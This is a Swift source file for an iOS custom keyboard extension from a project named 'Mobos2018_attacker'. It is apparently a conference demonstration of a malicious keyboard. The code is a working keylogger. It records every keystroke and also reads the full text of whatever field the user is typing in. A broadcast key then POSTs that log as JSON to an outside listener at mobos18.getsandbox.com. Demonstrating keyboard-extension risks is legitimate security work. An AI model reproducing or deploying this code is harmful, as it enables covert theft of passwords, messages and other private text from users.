//
//  KeyboardViewController.swift
//  Mobos2018_attacker
//
//  Created by Mircea Vasiliniuc on 2/12/18.
//  Copyright © 2018 Mircea Vasiliniuc. All rights reserved.
//

import UIKit

class KeyboardViewController: UIInputViewController {
    private var keyLog = String()
    
    // MARK: UITextInputDelegate Methods
    
    override func textWillChange(_ textInput: UITextInput?) {
        self.gatherContent(forTextInput: textInput)
    }
    
    override func textDidChange(_ textInput: UITextInput?) {
        self.gatherContent(forTextInput: textInput)
    }
    
    // MARK: Keyboard Handling
    
    @IBAction func keyPressed(_ sender: UIButton) {
        animatePress(sender)
        
        guard let string = sender.titleLabel?.text else {return}
        (textDocumentProxy as UIKeyInput).insertText("\(string)")
        
        keyLog.append(string)
    }
    
    @IBAction func handleCapsLockKeyPress(_ sender: UIButton) {
        animatePress(sender)
        
        // TODO: Add capslock support
    }
    
    @IBAction func handleBackSpaceKeyPress(_ sender: UIButton) {
        animatePress(sender)
        
        (textDocumentProxy as UIKeyInput).deleteBackward()
        guard keyLog.count > 0 else {return}
        keyLog.removeLast()
    }
    
    @IBAction func handleNextKeyboardPress(_ sender: UIButton) {
        animatePress(sender)
        advanceToNextInputMode()
    }
    
    @IBAction func handleSpaceKeyPress(_ sender: UIButton) {
        animatePress(sender)
        (textDocumentProxy as UIKeyInput).insertText(" ")
        keyLog.append(" ")
    }
    
    @IBAction func handleReturnKeyPress(_ sender: UIButton) {
        animatePress(sender)
        (textDocumentProxy as UIKeyInput).insertText("\n")
        keyLog.append("\n")
    }
    
    @IBAction func handleBroadcastKeyPress(_ sender: UIButton) {
        animatePress(sender)
        guard keyLog.count > 0 else {return}
        
        broadcastKeyLog()
        keyLog = ""
    }
    
    // MARK: Private Methods
    
    private func animatePress(_ view: UIView) {
        UIView.animate(withDuration: 0.1, animations: {
            view.isUserInteractionEnabled = false
            view.transform = view.transform.scaledBy(x: 2, y: 2)
        }, completion: {(_) -> Void in
            view.isUserInteractionEnabled = true
            view.transform = view.transform.scaledBy(x: 0.5, y: 0.5)
        })
    }
    
    private func gatherContent(forTextInput textInput: UITextInput?) {
        guard let start = textInput?.beginningOfDocument,
            let end = textInput?.endOfDocument,
            let range = textInput?.textRange(from: start, to: end),
            let message = textInput?.text(in: range) else {
                return
        }
        keyLog.append(message)
    }
    
    private func broadcastKeyLog() {
        let keyboardRequest = KeyboardRequest(message: keyLog)
        let session = URLSession.shared
        let dataTask = session.dataTask(with: keyboardRequest.keyboardURLRequest,
                                        completionHandler: { (data, response, error) in
                                            print(error.debugDescription)
        })
        dataTask.resume()
    }
}

struct KeyboardRequest {
    let keyboardURLRequest: URLRequest
    
    let urlString = "https://mobos18.getsandbox.com/keyboardListener"
    let headers = ["Content-Type": "application/json"]
    let httpMethod = "POST"
    
    private let iso8601: Formatter = {
        let formatter = ISO8601DateFormatter()
        formatter.formatOptions = [.withFullDate, .withFullTime]
        return formatter
    }()
    
    init(message: String = "") {
        let validURL = URL(string: self.urlString)! // Avoid forced unwrap
        var parameters = [String: String]()
        
        if let dateString = self.iso8601.string(for: Date()) {
            parameters["timestamp"] = dateString
        }
        parameters["message"] = message
        
        var request = URLRequest(url: validURL)
        request.httpMethod = "POST"
        request.allHTTPHeaderFields = headers
        
        do {
            let postData = try JSONSerialization.data(withJSONObject: parameters)
            request.httpBody = postData
        }
        catch {
            print("Empty http body!")
        }
        
        self.keyboardURLRequest = request
    }
}
